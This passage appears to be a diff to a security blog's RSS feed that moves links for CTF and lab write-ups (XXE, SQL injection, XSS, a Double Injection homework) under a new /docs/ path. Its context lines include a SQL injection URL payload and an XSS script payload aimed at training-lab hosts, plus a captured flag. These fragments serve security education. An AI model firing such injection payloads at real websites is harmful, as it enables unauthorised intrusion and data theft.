-&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
  Simple Web 0x23(Lab - XXE)
  &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
 &lt;/h1>
@@ -3483,7 +3483,7 @@ app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
 &lt;h2 id="reference">
  Reference
  &lt;a class="anchor" href="#reference">#&lt;/a>
-&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
+&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
  Simple Web 0x24(Lab - how2http)
  &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
 &lt;/h1>
@@ -3520,7 +3520,7 @@ app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
  Exploit
  &lt;a class="anchor" href="#exploit">#&lt;/a>
 &lt;/h2>
-&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
+&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item><item><title>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/</guid><description>&lt;h1 id="simple-web-0x412023-hw---double-injection---flag1">
  Simple Web 0x41(2023 HW - Double Injection - FLAG1)
  &lt;a class="anchor" href="#simple-web-0x412023-hw---double-injection---flag1">#&lt;/a>
 &lt;/h1>
@@ -3559,7 +3559,7 @@ app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">}&amp;#39;);
 &lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">`&lt;/span>);
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
-:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
+:::spoiler Dockerfile&lt;/p></description></item><item><title>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/</guid><description>&lt;h1 id="simple-web-0x422023-hw---double-injection---flag2">
  Simple Web 0x42(2023 HW - Double Injection - FLAG2)
  &lt;a class="anchor" href="#simple-web-0x422023-hw---double-injection---flag2">#&lt;/a>
 &lt;/h1>
@@ -3630,7 +3630,7 @@ drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var
 &lt;/ul>
 &lt;/li>
 &lt;/ul>
-&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
+&lt;p>Flag: &lt;code>FLAG{ezzzzz_sqli2ssti}&lt;/code>&lt;/p></description></item><item><title>Simple Welcome - 0x04(Lab - Script)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/</guid><description>&lt;h1 id="simple-welcome---0x04lab---script">
  Simple Welcome - 0x04(Lab - Script)
  &lt;a class="anchor" href="#simple-welcome---0x04lab---script">#&lt;/a>
 &lt;/h1>
@@ -3658,7 +3658,7 @@ drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var
  Analysis
  &lt;a class="anchor" href="#analysis">#&lt;/a>
 &lt;/h3>
-&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
+&lt;p>Must write a script that can be executed in python and node language simultaneously.&lt;/p></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
  SQLi - APPRENTICE
  &lt;a class="anchor" href="#sqli---apprentice">#&lt;/a>
 &lt;/h1>
@@ -3681,7 +3681,7 @@ drwxr-xr-x	12	root	root	4096	Dec	7	09:43	var
 &lt;p>Payload: &lt;code>https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#&lt;/code>
 :::spoiler Success Screenshot
 &lt;img src="https://i.imgur.com/pPKFYKj.png" alt="" />
-:::&lt;/p></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
+:::&lt;/p></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
  Web Cheat Sheet
  &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
 &lt;/h1>
@@ -3753,7 +3753,7 @@ $ ./wasm2c {wasm file path} -o {output c file path}
 &lt;a href="https://webhook.site/">Webhook.site&lt;/a>
 &lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
 &lt;a href="https://ngrok.com/">Ngrok&lt;/a>&lt;/li>
-&lt;/ul></description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</guid><description>&lt;h1 id="xss---apprentice">
+&lt;/ul></description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/</guid><description>&lt;h1 id="xss---apprentice">
  XSS - APPRENTICE
  &lt;a class="anchor" href="#xss---apprentice">#&lt;/a>
 &lt;/h1>
@@ -3795,7 +3795,7 @@ $ ./wasm2c {wasm file path} -o {output c file path}
 Payload: &lt;code>&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;&lt;/code>
 :::spoiler Success Screenshot
 &lt;img src="https://i.imgur.com/aArBCbN.png" alt="" />
-:::&lt;/p></description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</guid><description>&lt;h1 id="xxe---apprentice">
+:::&lt;/p></description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/</guid><description>&lt;h1 id="xxe---apprentice">
  XXE - APPRENTICE
  &lt;a class="anchor" href="#xxe---apprentice">#&lt;/a>
 &lt;/h1>
